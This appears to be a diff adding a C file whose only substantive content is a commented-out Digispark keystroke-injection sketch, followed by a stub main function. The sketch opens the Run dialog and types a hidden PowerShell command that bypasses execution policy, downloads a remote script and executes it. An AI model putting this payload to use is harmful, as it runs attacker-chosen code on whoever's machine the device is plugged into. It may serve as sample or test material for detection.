@@ -1,0 +1,9 @@
+/*
+#include "DigiKeyboard.h"
+void setup() {
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.println("powershell -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\'https://nviso.eu/script.ps1')\"");
+}
+void loop() {}
+*/
+int main() { return 0; }
